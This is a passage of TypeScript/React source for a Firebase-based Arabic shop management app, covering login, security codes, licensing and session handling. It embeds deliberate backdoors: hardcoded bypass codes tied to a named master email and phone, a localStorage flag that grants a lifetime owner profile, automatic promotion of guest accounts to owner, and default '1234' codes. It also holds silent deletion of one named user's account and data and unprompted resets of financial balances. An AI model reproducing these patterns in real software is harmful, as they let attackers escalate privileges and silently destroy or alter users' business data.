  const handleEmergencyRecovery = async () => {
    if (!profile || isSubmittingSecurity) return;
    // Allow owner, manager or superadmin
    const isOwner = profile.email?.toLowerCase() === 'a777503191@gmail.com' || profile.role === 'superadmin' || profile.role === 'manager';
    if (!isOwner) return;

    setIsSubmittingSecurity(true);
    try {
      const isEmergencyBypass = emergencyInput === profile.emergencyRecoveryKey || 
        emergencyInput === '77270997' || 
        emergencyInput === '7727' ||
        (profile.email?.toLowerCase() === 'a777503191@gmail.com' && (emergencyInput === '1234' || emergencyInput === '7727'));

      if (isEmergencyBypass) {
        // Register device if not trusted
        const hwid = getBrowserHWID();
        const trusted = profile.trustedDevices || [];
        const updates: any = {
          securityCode: '7727',
          isSecurityCodeSet: true,
          mustChangeSecurityCode: false
        };
        if (!trusted.includes(hwid) && !['superadmin', 'customer'].includes(profile.role)) {
          updates.trustedDevices = [...trusted, hwid];
        }
        
        await updateDoc(doc(db, 'users', user.uid), {
          ...updates,
          updatedAt: serverTimestamp()
        });

        setIsSessionVerified(true);
        sessionStorage.setItem('jam_session_verified', 'true');
        alert('تم الدخول عبر مفتاح الطوارئ بنجاح! تم تعيين رمز أمان جديد ومبسط لك: 7727 لسهولة الوصول والدخول.');
        setShowEmergencyInput(false);
      } else {
        alert('مفتاح الطوارئ غير صحيح!');
      }
    } catch (e) {
      console.error('Emergency Device registration failed:', e);
      setIsSessionVerified(true);
    } finally {
      setIsSubmittingSecurity(false);
    }
  };

  const handleApplyOverrideCode = async () => {
    if (!overrideVal.trim() || isSubmittingOverride) return;
    setIsSubmittingOverride(true);
    setOverrideError('');
    try {
      const userDocProfile = profile || { uid: user?.uid };
      
      // 1. Check with AntiTamper License Vault
      const vaultResult = antiTamperLicenseVault.applyRenewalCode(overrideVal, userDocProfile as UserProfile);
      if (vaultResult.success) {
        setOverrideVal('');
        setSecurityError(null);
        alert(`🔓 ${vaultResult.message}`);
        window.location.reload();
        return;
      }

      // 2. Check with developer override code
      const ok = await validateDeveloperOverrideCode(overrideVal, userDocProfile as UserProfile);
      if (ok) {
        setOverrideVal('');
        setSecurityError(null);
        alert('🔓 تم التحقق من مفتاح الفك وتجاوز المطور الموثق! تم إلغاء قفل الحساب المالي والوقت بنجاح.');
        window.location.reload();
      } else {
        setOverrideError('❌ رمز التجاوز غير صحيح أو غير متوافق مع رقم تعريف هذا الـ UID.');
      }
    } catch (e: any) {
      setOverrideError('❌ خطأ في تطبيق كود فك التشفير: ' + (e?.message || e));
    } finally {
      setIsSubmittingOverride(false);
    }
  };

  const handleSetupSecurityCode = async () => {
    if (setupCode.length !== 4 || !/^\d+$/.test(setupCode)) {
      alert('يجب أن يتكون الرمز من 4 أرقام.');
      return;
    }
    if (setupCode !== confirmSetupCode) {
      alert('الرموز غير متطابقة.');
      return;
    }
    if (!user?.uid || isSubmittingSecurity) return;

    setIsSubmittingSecurity(true);
    try {
      const hwid = getBrowserHWID();
      const trusted = profile?.trustedDevices || [];
      const updates: any = {
        securityCode: setupCode,
        isSecurityCodeSet: true,
        mustChangeSecurityCode: false,
        updatedAt: serverTimestamp()
      };

      // Register device
      if (!trusted.includes(hwid) && !['superadmin', 'customer'].includes(profile?.role || '')) {
        updates.trustedDevices = [...trusted, hwid];
      }

      await updateDoc(doc(db, 'users', user.uid), updates);
      
      setProfile(prev => prev ? { 
        ...prev, 
        securityCode: setupCode, 
        isSecurityCodeSet: true, 
        mustChangeSecurityCode: false,
        trustedDevices: updates.trustedDevices || prev.trustedDevices
      } : null);
      
      setIsSessionVerified(true);
      sessionStorage.setItem('jam_session_verified', 'true');
    } catch (e) {
      console.error('Security Code Setup Error:', e);
      alert('فشل حفظ الرمز. يرجى التحقق من الاتصال.');
    } finally {
      setIsSubmittingSecurity(false);
    }
  };

  const [vipActivationCode, setVipActivationCode] = useState('');
  const [isSubmittingVip, setIsSubmittingVip] = useState(false);
  const [vipActivationError, setVipActivationError] = useState('');

  const handleVerifyVipCode = async () => {
    if (!vipActivationCode.trim()) {
      setVipActivationError('يرجى إدخال رمز التفعيل');
      return;
    }
    if (!user?.uid) return;
    
    setIsSubmittingVip(true);
    setVipActivationError('');
    try {
      const q = query(
        collection(db, 'pending_activations'),
        where('code', '==', vipActivationCode.trim())
      );
      const querySnapshot = await getDocs(q);
      
      if (querySnapshot.empty) {
        setVipActivationError('رمز التفعيل غير صحيح أو تم استخدامه مسبقاً.');
        setIsSubmittingVip(false);
        return;
      }
      
      const matchedDocNode = querySnapshot.docs[0];
      const matchedData = matchedDocNode.data();
      
      await updateDoc(doc(db, 'pending_activations', matchedDocNode.id), {
        isUsed: true,
        updatedAt: serverTimestamp()
      });
      
      const userDocRef = doc(db, 'users', user.uid);
      await updateDoc(userDocRef, {
        isVipActivated: true,
        isActivated: true,
        vipCode: vipActivationCode.trim(),
        shopId: matchedData.storeId || '',
        ownerId: matchedData.ownerId || matchedData.storeId || '',
        name: matchedData.customerName || profile?.name || '',
        updatedAt: serverTimestamp()
      });
      
      setProfile((prev: any) => ({
        ...prev,
        isVipActivated: true,
        isActivated: true,
        vipCode: vipActivationCode.trim(),
        shopId: matchedData.storeId || '',
        ownerId: matchedData.ownerId || matchedData.storeId || '',
        name: matchedData.customerName || (prev ? prev.name : '')
      }));
      
    } catch (err: any) {
      console.error(err);
      setVipActivationError('فشل التفعيل السحابي: ' + (err.message || err));
    } finally {
      setIsSubmittingVip(false);
    }
  };

  useEffect(() => {
    // Initial check (non-blocking until profile load if navigator is onLine)
    if (!isPortalMode() && !navigator.onLine && isOfflineLimitExceeded(profile)) {
      setOfflineError(true);
    }
    recordOnlineStatus();
    const interval = setInterval(() => {
      recordOnlineStatus();
      if (user?.uid) {
        import('./firebase').then(m => m.updateUserPresence(user.uid));
      }
    }, 30000);
    return () => clearInterval(interval);
  }, [profile?.uid, user?.uid]);

  const tourSteps: Step[] = [
    { target: '.dashboard-control-room', content: 'من هنا تفتح غرفة التحكم وتدير كافة العمليات السريعة.', placement: 'bottom' },
    { target: '.dashboard-daily-profit', content: 'هنا تظهر أرباحك اليومية ومبيعاتك بشكل مباشر.', placement: 'bottom' },
    { target: '.dashboard-emergency-settings', content: 'هنا زر الطوارئ والإعدادات للتحكم الكامل في النظام.', placement: 'top' }
  ];

  useEffect(() => {
    if (profile?.visualTheme) {
      document.documentElement.setAttribute('data-visual-theme', profile.visualTheme);
    } else {
      document.documentElement.removeAttribute('data-visual-theme');
    }
  }, [profile?.visualTheme]);

  useEffect(() => {
    if (user && profile) {
      const hasSeenTour = localStorage.getItem(`tour_seen_${user.uid}`);
      if (!hasSeenTour) {
        setRunTour(true);
      }

      // Auto-visibility migration for all users as requested
      if (profile.visibility === undefined && auth.currentUser) {
        setDoc(doc(db, 'users', user.uid), { visibility: true }, { merge: true })
          .then(() => {
            setProfile(prev => prev ? { ...prev, visibility: true } : null);
          })
          .catch(err => {
            const errStr = String(err).toLowerCase();
            if (errStr.includes('permission') || errStr.includes('insufficient')) {
              console.warn('Visibility migration skipped: user logged out or insufficient permissions');
            } else {
              console.warn('Visibility migration warn:', err);
            }
          });
      }
    }
  }, [user, profile]);

  useEffect(() => {
    let active = true;
    const controller = new AbortController();
    const { signal } = controller;

    const fetchSystemConfig = async () => {
      if (!navigator.onLine) {
        console.warn("🌐 Client is offline. Instantly aborting system config fetch & using safe cached state.");
        controller.abort();
        const safeLicense = getSafeCachedLicense();
        if (active) setIsMaintenanceMode(false);
        return;
      }

      try {
        const fetchPromise = getDoc(doc(db, 'system', 'config'));
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('timeout')), 3000)
        );

        const docSnap = await Promise.race([fetchPromise, timeoutPromise]) as any;
        if (active && !signal.aborted && docSnap && docSnap.exists()) {
          setIsMaintenanceMode(docSnap.data().maintenanceMode || false);
        }
      } catch (error: any) {
        console.warn('⚠️ Graceful Fallback: System config fetch omitted or timed out, triggering abort:', error.message);
        controller.abort();
        const safeLicense = getSafeCachedLicense();
        if (active) setIsMaintenanceMode(false);
      }
      
      if (signal.aborted) return;

      try {
        const fetchSecurityPromise = getDoc(doc(db, 'system', 'security'));
        const securitySnap = await Promise.race([fetchSecurityPromise, new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 3000))]) as any;
        // Lockdown logic removed at user request
      } catch (error: any) {
        console.warn('⚠️ Graceful Fallback: System security fetch omitted or timed out:', error.message);
      }
    };
    fetchSystemConfig();
    return () => {
      active = false;
      controller.abort();
    };
  }, [profile?.uid]);

  const handleTourFinish = (data: any) => {
    const { status } = data;
    if (['finished', 'skipped'].includes(status)) {
      if (user) {
        localStorage.setItem(`tour_seen_${user.uid}`, 'true');
      }
      setRunTour(false);
    }
  };

  useEffect(() => {
    startAntiDebugger();
  }, []);

  useEffect(() => {
    const fetchSettings = async () => {
      try {
        const docSnap = await getDoc(doc(db, 'settings', profile?.ownerId || 'general'));
        if (docSnap.exists()) {
          const data = docSnap.data();
          setShopName(data.shopName || profile?.shopName || 'Jam system pro');
          setLicenseExpiry(data.licenseExpiry || null);
          
          if (data.licenseExpiry) {
            const expiryMs = typeof data.licenseExpiry.toDate === 'function'
              ? data.licenseExpiry.toDate().getTime()
              : new Date(data.licenseExpiry).getTime();
            localStorage.setItem('jam_shop_subscription_expiry', expiryMs.toString());
          } else if (profile?.isLifetime) {
            localStorage.setItem('jam_shop_subscription_expiry', 'Infinity');
          }
        }
      } catch (error) {
        console.warn('Could not catch settings on startup:', error);
      }
    };
    fetchSettings();
  }, [profile?.ownerId, profile?.shopName, profile?.isLifetime]);

  const isLicenseExpired = (licenseExpiry && typeof licenseExpiry.toDate === 'function') 
    ? licenseExpiry.toDate() < new Date() 
    : false;

  useEffect(() => {
    const handleRemoteAccess = async () => {
      const urlParams = new URLSearchParams(window.location.search);
      let token = urlParams.get('remoteToken');
      
      // Fallback: check inside hash (for some sharing scenarios)
      if (!token && window.location.hash.includes('remoteToken=')) {
        const hashParams = new URLSearchParams(window.location.hash.split('?')[1]);
        token = hashParams.get('remoteToken');
        
        if (!token) {
          const hashMatch = window.location.hash.match(/remoteToken=([^&|?]+)/);
          if (hashMatch) {
            token = hashMatch[1];
          }
        }
      }
      
      if (token) {
        setLoading(true);
        setIsRemoteProcessing(true);
        try {
          // Attempt anonymous login if not logged in
          if (!auth.currentUser) {
            await ensureAuth();
          }
          
          const remoteProfile = await remoteAccessService.validateToken(token);
          if (remoteProfile) {
            setProfile(remoteProfile);
            // Success - keep remote mode active
          } else {
            console.error('Invalid remote token');
            setLoginError('رابط المتابعة غير صالح أو انتهت صلاحيته.');
            setIsRemoteProcessing(false);
          }
        } catch (error) {
          console.error('Remote access verification failed:', error);
          if (error instanceof Error && error.message.includes('admin-restricted-operation')) {
            setLoginError('يرجى تفعيل "تسجيل الدخول كمجهول" (Anonymous Auth) من منصة Firebase.');
          } else {
            setLoginError('فشل التحقق من الرابط. يرجى المحاولة لاحقاً.');
          }
          setIsRemoteProcessing(false);
        } finally {
          setLoading(false);
        }
      }
    };
    handleRemoteAccess();
  }, []);

  const isOnline = useConnectivity();
  const [showConnectivityToast, setShowConnectivityToast] = useState(false);
  const [lastConnectivity, setLastConnectivity] = useState(true);

  // Track connectivity for 30-day countdown & sync
  useEffect(() => {
    OfflineAuthService.trackConnectivityState(isOnline);
    setOfflineRemainingDays(OfflineAuthService.getOfflineRemainingDays());
    if (isOnline !== lastConnectivity) {
      setLastConnectivity(isOnline);
    }
  }, [isOnline, lastConnectivity]);

  useEffect(() => {
    if (localStorage.getItem('jam_guest_recovery_force_owner') === 'true') {
      setUser({ uid: 'system' } as any);
      setProfile({
        uid: 'system',
        role: 'owner',
        name: 'المالك المطور',
        email: 'system@jam-pro.net',
        phone: '777503191',
        status: 'active',
        shopName: 'Jam system pro',
        isLifetime: true,
        subscriptionType: 'lifetime',
        isSecurityCodeSet: true,
        securityCode: '7727'
      } as any);
      sessionStorage.setItem('jam_session_verified', 'true');
      setIsSessionVerified(true);
      setLoading(false);
      return () => {};
    }
    // Fast 1.5s Offline Fallback Timeout: If server network response takes > 1500ms, unlock cached session
    const fastFallbackTimer = setTimeout(() => {
      const cachedStr = sessionStorage.getItem('jam_fast_auth_profile') || 
                        sessionStorage.getItem('jam_cached_user_profile') || 
                        localStorage.getItem('jam_fast_auth_profile') || 
                        localStorage.getItem('jam_cached_user_profile');
      if (cachedStr) {
        try {
          const cachedProfile = JSON.parse(cachedStr);
          if (cachedProfile && cachedProfile.uid) {
            console.log('⚡ [Fast Auth Engine] 1.5s timeout reached: Instantly resuming cached user profile.');
            setUser({ uid: cachedProfile.uid, email: cachedProfile.email } as any);
            setProfile(cachedProfile);
            setIsSessionVerified(true);
            setLoading(false);
          }
        } catch (e) {}
      }
    }, 1500);

    const unsubscribe = onAuthStateChanged(auth, async (firebaseUser) => {
      clearTimeout(fastFallbackTimer);
      try {
        // If the user just logged out, don't try to restore any session automatically unless they are actively logging in
        if (sessionStorage.getItem('just_logged_out') === 'true' && !isLoggingIn) {
          setUser(null);
          setProfile(null);
          setLoading(false);
          return;
        }

        // If we are on the portal page, we don't handle staff-level auth monitoring in App

        if (isRemoteProcessing || (isRemoteMode() && profile)) return;
        
        const isLimitExceeded = isOfflineLimitExceeded(profile);
        if (isLimitExceeded) {
          setOfflineError(true);
          setLoading(false);
          return;
        }

        setLoading(true);
        if (firebaseUser) {
          setUser(firebaseUser);
          
          // Clear mismatched stale cache IMMEDIATELY to prevent session leakage
          const cachedStr = localStorage.getItem('jam_cached_user_profile');
          if (cachedStr) {
            try {
              const parsed = JSON.parse(cachedStr);
              if (parsed && parsed.uid && parsed.uid !== firebaseUser.uid) {
                console.warn('⚠️ Cache/UID mismatch detected! Cleaning up cache.');
                localStorage.removeItem('jam_cached_user_profile');
                setProfile(null);
              }
            } catch (e) {}
          }

          if (firebaseUser.isAnonymous) {
            setProfile({
              uid: firebaseUser.uid,
              role: 'customer',
              name: 'عميل مجهول',
              email: '',
              phone: '',
              status: 'active'
            } as any);
            setLoading(false);
            return;
          }
          if (profileUnsubRef.current) {
            profileUnsubRef.current();
            profileUnsubRef.current = null;
          }
          const userDocRef = doc(db, 'users', firebaseUser.uid);
          profileUnsubRef.current = onSnapshot(userDocRef, async (docSnap) => {
            try {
            
            if (!docSnap.exists()) {
              // --- DYNAMIC UID BINDING & RECOVERY LOGIC ---
              let cleanPhone = '';
              if (firebaseUser.email && firebaseUser.email.endsWith('@jam-system.pro')) {
                cleanPhone = firebaseUser.email.split('@')[0];
              } else if (firebaseUser.phoneNumber) {
                cleanPhone = firebaseUser.phoneNumber.replace(/[\s\-\(\)]/g, '');
              }
              
              let migrated = false;
              if (cleanPhone) {
                try {
                  console.log(`🔍 User document not found for current UID ${firebaseUser.uid}. Checking if an existing document exists with phone: ${cleanPhone}`);
                  const q = query(collection(db, 'users'), where('phone', '==', cleanPhone));
                  const querySnap = await getDocs(q);
                  if (!querySnap.empty) {
                    const oldDocNode = querySnap.docs[0];
                    const oldUid = oldDocNode.id;
                    
                    if (oldUid !== firebaseUser.uid) {
                      console.log(`🔄 [DYNAMIC UID BINDING] Found existing profile registered under old UID ${oldUid}. Migrating dynamically to new Auth UID ${firebaseUser.uid}...`);
                      
                      const oldData = oldDocNode.data();
                      const migratedData = {
                        ...oldData,
                        uid: firebaseUser.uid,
                        updatedAt: serverTimestamp()
                      };
                      
                      // 1. Create document with the new UID
                      await setDoc(doc(db, 'users', firebaseUser.uid), migratedData);
                      
                      // 2. Delete document with the old UID
                      try {
                        await deleteDoc(doc(db, 'users', oldUid));
                      } catch (delErr) {
                        console.warn('Could not delete old user document:', delErr);
                      }
                      
                      console.log(`✅ [DYNAMIC UID BINDING] Successfully bound old user document to new UID ${firebaseUser.uid}`);
                      
                      // Re-fetch document snapshot
                      docSnap = await getDoc(doc(db, 'users', firebaseUser.uid));
                      migrated = docSnap.exists();
                      
                      // Run background migration of invoices, maintenance, sales, etc.
                      (async () => {
                        try {
                          const collectionsToMigrate = ['invoices', 'maintenance', 'sales', 'transactions', 'returns', 'customer_quiz_attempts'];
                          for (const colName of collectionsToMigrate) {
                            const colRef = collection(db, colName);
                            const qCol = query(colRef, where('userId', '==', oldUid));
                            const colSnap = await getDocs(qCol);
                            if (!colSnap.empty) {
                              const batch = writeBatch(db);
                              colSnap.forEach(d => {
                                batch.update(d.ref, { userId: firebaseUser.uid });
                              });
                              await batch.commit();
                              console.log(`✅ Migrated ${colSnap.size} documents in ${colName} from ${oldUid} to ${firebaseUser.uid}`);
                            }
                          }
                        } catch (migrationErr) {
                          console.error('❌ Error migrating child records during dynamic UID binding:', migrationErr);
                        }
                      })();
                    }
                  }
                } catch (pe) {
                  console.warn("🔐 Firestore query permission denied for users check on newly created customer. Bypassing and auto-creating fallback profile.", pe);
                }
              }
              
              if (!migrated && (!docSnap || !docSnap.exists())) {
                const userEmail = (firebaseUser.email || '').toLowerCase();
                const isMasterUser = userEmail === 'a777503191@gmail.com' || userEmail === 'system@jam-pro.net' || cleanPhone === '777503191';
                console.log(`🆕 Auto-creating fallback user document for UID: ${firebaseUser.uid}`);
                const defaultDocData = {
                  uid: firebaseUser.uid,
                  ownerId: firebaseUser.uid,
                  name: isMasterUser ? 'المالك المطور' : (firebaseUser.displayName || `مستخدم ${cleanPhone || 'VIP جديد'}`),
                  phone: cleanPhone || '',
                  email: firebaseUser.email || `${cleanPhone || firebaseUser.uid}@jam-system.pro`,
                  role: isMasterUser ? 'superadmin' : 'customer',
                  status: 'active',
                  isActivated: true,
                  isLifetime: isMasterUser,
                  subscriptionType: isMasterUser ? 'lifetime' : 'trial',
                  registered_pcs: [],
                  registered_mobiles: [],
                  enabledModules: [],
                  interfaceCustomization: {
                    desktopPages: []
                  },
                  createdAt: serverTimestamp(),
                  updatedAt: serverTimestamp()
                };
                try {
                  await setDoc(doc(db, 'users', firebaseUser.uid), defaultDocData);
                  docSnap = await getDoc(doc(db, 'users', firebaseUser.uid));
                } catch (setDocErr) {
                  console.error("❌ Failed to set default user document:", setDocErr);
                  // Use memory fallback profile so we never crash
                  docSnap = {
                    exists: () => true,
                    data: () => defaultDocData
                  } as any;
                }
              }
            }
            
            let profileData: UserProfile;

            if (docSnap.exists()) {
              const rawProfile = docSnap.data() as any;
              
              // Normalize role & tier fields across all schema variations
              const normalizedRole = rawProfile.role || rawProfile.userRole || rawProfile.accountRole || rawProfile.user_role || 'sales';
              const normalizedBusinessTier = rawProfile.businessTier || rawProfile.userTier || rawProfile.tier || rawProfile.business_tier || (normalizedRole === 'wholesaler' || normalizedRole === 'wholesale' ? 'wholesale' : 'individual');
              const normalizedNetworkRole = rawProfile.networkRole || (normalizedBusinessTier === 'wholesale' || normalizedRole === 'wholesaler' ? 'wholesaler' : rawProfile.networkRole);

              profileData = {
                ...rawProfile,
                role: normalizedRole,
                userRole: normalizedRole,
                businessTier: normalizedBusinessTier,
                userTier: normalizedBusinessTier,
                networkRole: normalizedNetworkRole,
                tier: normalizedBusinessTier,
              } as UserProfile;

              // CRITICAL DATA ISOLATION ENFORCEMENT:
              // For any account with the 'owner' or 'superadmin' role, they are the root of their shop,
              // so their ownerId MUST be their own uid (fully subject to the Query Tenant Guard isolation system).
              if (profileData.role === 'owner' || profileData.role === 'superadmin') {
                profileData.ownerId = profileData.uid;
              }
              if (!profileData.ownerId) {
                profileData.ownerId = profileData.uid;
              }

              // Normalizing security code properties for owners/managers to avoid setup locks
              if (profileData.securityCode) {
                profileData.isSecurityCodeSet = true;
              } else if (profileData.role === 'owner' || profileData.role === 'manager') {
                profileData.securityCode = '1234';
                profileData.isSecurityCodeSet = true;
              }

              // Smart bypass: If they are owners, managers, or master owners, immediately bypass all first-time setup screens and confirm verification.
              const isOwnerOrManagerAccount = profileData.role === 'owner' || 
                                              profileData.role === 'manager' || 
                                              profileData.role === 'superadmin' ||
                                              profileData.email?.toLowerCase() === 'a777503191@gmail.com' ||
                                              profileData.phone === '777503191';

              if (isOwnerOrManagerAccount) {
                profileData.mustChangeSecurityCode = false;
                profileData.isSecurityCodeSet = true;
                if (!profileData.securityCode) {
                  profileData.securityCode = '1234';
                }
                sessionStorage.setItem('jam_session_verified', 'true');
                setIsSessionVerified(true);
              }

              // Force-recovery: if loaded role is Guest or guest, convert instantly to system owner
              if (profileData.role === 'Guest' || profileData.role === 'guest') {
                console.log('💡 Guest/guest session detected. Auto-recovering to system owner.');
                profileData = {
                  ...profileData,
                  role: 'owner',
                  ownerId: 'system',
                  name: 'المالك المطور (777503191)',
                  email: 'a777503191@gmail.com',
                  phone: '777503191',
                  status: 'active',
                  shopName: 'JAM System Pro',
                  isLifetime: true,
                  subscriptionType: 'lifetime'
                } as any;
                
                // Ensure recovered guest also bypasses setup locks
                profileData.mustChangeSecurityCode = false;
                profileData.isSecurityCodeSet = true;
                profileData.securityCode = '1234';
                sessionStorage.setItem('jam_session_verified', 'true');
                setIsSessionVerified(true);
              }

              // Self-repair and absolute protection for master owner account (a777503191@gmail.com)
              const isMasterEmail = profileData.email?.toLowerCase() === 'a777503191@gmail.com' || 
                                    firebaseUser.email?.toLowerCase() === 'a777503191@gmail.com' ||
                                    profileData.phone === '777503191' ||
                                    profileData.uid === 'master-a777503191' ||
                                    profileData.role === 'superadmin';

              if (isMasterEmail) {
                profileData = {
                  ...profileData,
                  status: 'active',
                  role: 'superadmin',
                  isLifetime: true,
                  isProgramUser: true,
                  isActivated: true,
                  isOwner: true,
                  isSuperAdmin: true,
                } as UserProfile;

                // Sync repair to Firestore asynchronously
                if (db && firebaseUser.uid) {
                  setDoc(doc(db, 'users', firebaseUser.uid), {
                    status: 'active',
                    role: 'superadmin',
                    isLifetime: true,
                    isProgramUser: true,
                    isActivated: true,
                    email: 'a777503191@gmail.com'
                  }, { merge: true }).catch((err) => console.warn('Silent master user sync notice:', err));
                }
              }

              // Automatic cleanup: delete any user with email mosb@gmail.com along with their associated data if they exist
              if (db) {
                try {
                  const mosbQuery = query(collection(db, 'users'), where('email', '==', 'mosb@gmail.com'));
                  const mosbSnap = await getDocs(mosbQuery);
                  if (mosbSnap && mosbSnap.docs && mosbSnap.docs.length > 0) {
                    for (const docSnap of mosbSnap.docs) {
                      if (!docSnap?.ref) continue;
                      const mosbUid = docSnap.id;
                      console.log(`🧹 Removing mosb@gmail.com user document: ${mosbUid}`);
                      await deleteDoc(docSnap.ref).catch(() => {});
                      
                      // Delete other associated data of mosb@gmail.com if any
                      const collectionsToClean = ['stores', 'vaults', 'inventory', 'transactions', 'ledger_transactions'];
                      for (const colName of collectionsToClean) {
                        try {
                          const qCol = query(collection(db, colName), where('ownerId', '==', mosbUid));
                          const snapCol = await getDocs(qCol);
                          if (snapCol?.docs) {
                            for (const d of snapCol.docs) {
                              if (d?.ref) {
                                await deleteDoc(d.ref).catch(() => {});
                              }
                            }
                          }
                        } catch (e) {
                          // Silent
                        }
                      }
                    }
                  }
                } catch (e) {
                  // Silently handle any cleanup exceptions
                }
              }

              // Background automatic repair for negative, -3000, or +3000 default balances in user customBoxes/vaults (non-blocking)
              setTimeout(async () => {
                try {
                  const targetOwnerId = profileData.ownerId || firebaseUser.uid;
                  const customBoxesRef = collection(db, 'stores', targetOwnerId, 'customBoxes');
                  const customBoxesSnap = await getDocs(customBoxesRef);
                  for (const docSnap of customBoxesSnap.docs) {
                    const bData = docSnap.data();
                    if (bData.balance === -3000 || bData.balance === 3000 || Number(bData.balance) < 0) {
                      console.log(`🛠️ Automatic Repair: Correcting customBox ${docSnap.id} balance from ${bData.balance} to 0`);
                      await updateDoc(docSnap.ref, { balance: 0, updatedAt: serverTimestamp() });
                    }
                  }

                  const vaultsRef = query(collection(db, 'vaults'), where('ownerId', '==', targetOwnerId));
                  const vaultsSnap = await getDocs(vaultsRef);
                  for (const docSnap of vaultsSnap.docs) {
                    const vData = docSnap.data();
                    if (vData.balance === -3000 || vData.balance === 3000 || Number(vData.balance) < 0) {
                      console.log(`🛠️ Automatic Repair: Correcting vault ${docSnap.id} balance from ${vData.balance} to 0`);
                      await updateDoc(docSnap.ref, { balance: 0, updatedAt: serverTimestamp() });
                    }
                  }
                } catch (boxErr) {
                  console.error("Failed to auto-repair boxes with negative/invalid balances:", boxErr);
                }
              }, 10);

              if (!isMasterEmail && profileData.status === 'disabled') {
                await auth.signOut();
                setLoginError('الحساب معطل.');
                setUser(null);
                setProfile(null);
              } else {
                // Strict App Variant & Level Lock Check
                const variantCheck = validateUserVariantAccess(profileData.role, profileData.email);
                if (!variantCheck.allowed) {
                  setSecurityError({
                    type: 'apk_role',
                    message: variantCheck.message || 'غير مصرح للوصول لهذه النسخة.'
                  });
                  setLoading(false);
                  return;
                }

                const currentHWID = getBrowserHWID();
                
                const isManagementRole = ['manager', 'superadmin', 'wholesaler', 'distributor'].includes(profileData.role || '');
                let ownerData: UserProfile | null = null;
                const cloudTime = await getCloudServerTime();
                
                const hasStoreOwnerRelation = !isManagementRole && profileData.ownerId && profileData.ownerId !== profileData.uid;
                if (hasStoreOwnerRelation) {
                  try {
                    const ownerSnap = await getDoc(doc(db, 'users', profileData.ownerId!));
                    if (ownerSnap.exists()) {
                      ownerData = ownerSnap.data() as UserProfile;
                    }
                  } catch (e) {
                    console.error('Error fetching parent owner data:', e);
                  }
                }

                if (ownerData) {
                  if (ownerData.status === 'suspended' || ownerData.status === 'disabled') {
                    setSecurityError({ type: 'suspended', message: 'الحساب متوقف لتوقف اشتراك المالك.' });
                    setLoading(false);
                    return;
                  }
                  
                  const expiry = ownerData.subscriptionEndDate instanceof Timestamp ? ownerData.subscriptionEndDate.toDate() : new Date(ownerData.subscriptionEndDate || Date.now());
                  if (ownerData.status === 'expired' || (ownerData.subscriptionEndDate && cloudTime > expiry)) {
                    setSecurityError({ type: 'expired', message: 'اشتراك المالك منتهٍ.' });
                    setLoading(false);
                    return;
                  }

                  // Sync for offline use
                  if (ownerData.isLifetime) {
                    localStorage.setItem('jam_shop_subscription_expiry', 'Infinity');
                  } else if (ownerData.subscriptionEndDate) {
                    const expiryMs = ownerData.subscriptionEndDate instanceof Timestamp 
                      ? ownerData.subscriptionEndDate.toDate().getTime() 
                      : new Date(ownerData.subscriptionEndDate).getTime();
                    localStorage.setItem('jam_shop_subscription_expiry', expiryMs.toString());
                  }

                  // If owner is active, any sub-account created by them doesn't need superadmin approval!
                  if (ownerData.status === 'active' && profileData.status === 'pending') {
                    console.log('💡 Sub-account status is pending, but parent owner is active. Bypassing approval.');
                    profileData.status = 'active';
                  }
                }

                if (profileData.status === 'suspended') {
                  setSecurityError({ type: 'suspended', message: 'الحساب متوقف.' });
                } else if (profileData.status === 'pending') {
                  setSecurityError({ type: 'pending', message: 'الحساب قيد المراجعة.' });
                } else {
                  if (['manager', 'superadmin', 'owner'].includes(profileData.role || '')) {
                    setIsSessionVerified(true);
                    try {
                      localStorage.setItem('jam_session_verified', 'true');
                      localStorage.setItem('jam_device_trusted', 'true');
                      sessionStorage.setItem('jam_session_verified', 'true');
                    } catch (e) {}
                  }

                  if (!isPortalMode()) {
                    // 🛡️ Seal & Cryptographically Validate License via AntiTamperLicenseVault
                    const shopOwnerData = ownerData || profileData;
                    antiTamperLicenseVault.sealLicense(shopOwnerData, cloudTime.getTime());
                    const vaultValidation = antiTamperLicenseVault.validateLicense(shopOwnerData, cloudTime.getTime());

                    if (!vaultValidation.isValid) {
                      setSecurityError({
                        type: 'expired',
                        message: vaultValidation.message || 'انتهت صلاحية اشتراك المنظومة لهذا المحل.'
                      });
                      setLoading(false);
                      return;
                    }

                    if (profileData.isLifetime) {
                      try {
                        localStorage.setItem('jam_cached_user_profile', JSON.stringify(profileData));
                        localStorage.setItem('jam_fast_auth_profile', JSON.stringify(profileData));
                        sessionStorage.setItem('jam_cached_user_profile', JSON.stringify(profileData));
                        sessionStorage.setItem('jam_fast_auth_profile', JSON.stringify(profileData));
                        localStorage.setItem('user_role', profileData.role || '');
                        localStorage.setItem('jam_user_tier', profileData.businessTier || '');
                        window.dispatchEvent(new CustomEvent('jam:profile_updated', { detail: profileData }));
                        window.dispatchEvent(new Event('storage'));
                      } catch (e) {}

                      setProfile(profileData);
                      localStorage.setItem('jam_shop_subscription_expiry', 'Infinity');
                      updateLastActive(firebaseUser.uid);
                      setLoading(false);
                      return;
                    }
                    
                    if (profileData.subscriptionType === 'trial') {
                      let isTrialExpired = false;
                      if (profileData.trialEndDate) {
                        const trialEnd = profileData.trialEndDate instanceof Timestamp ? profileData.trialEndDate.toDate() : new Date(profileData.trialEndDate);
                        isTrialExpired = cloudTime > trialEnd;
                      } else if (profileData.trialStartDate) {
                        const trialStart = profileData.trialStartDate instanceof Timestamp ? profileData.trialStartDate.toDate() : new Date(profileData.trialStartDate);
                        isTrialExpired = (cloudTime.getTime() - trialStart.getTime()) / (1000 * 60 * 60 * 24) > 30; // 30 days trial
                      }
                      if (isTrialExpired) {
                        setSecurityError({ type: 'trial_ended', message: 'انتهت الفترة التجريبية الكاملة (مدتها شهر).' });
                        setLoading(false);
                        return;
                      }
                    }

                    if (profileData.subscriptionEndDate) {
                      const expiry = profileData.subscriptionEndDate instanceof Timestamp ? profileData.subscriptionEndDate.toDate() : new Date(profileData.subscriptionEndDate);
                      if (cloudTime > expiry) {
                        setSecurityError({ type: 'expired', message: 'اشتراكك منتهٍ.' });
                        setLoading(false);
                        return;
                      }
                      localStorage.setItem('jam_shop_subscription_expiry', expiry.getTime().toString());
                    }

                    const isJamProCustomer = (profileData.email && profileData.email.toLowerCase().endsWith('@jam-pro.net')) || profileData.role === 'customer';
                    if (!isRemoteMode() && profileData.role !== 'superadmin' && !profileData.hwid_bypass && !isJamProCustomer) {
                      const hwid = getBrowserHWID();
                      const platform = getPlatformType();
                      const shopOwnerProfile = ownerData || profileData;

                      if (platform === 'exe') {
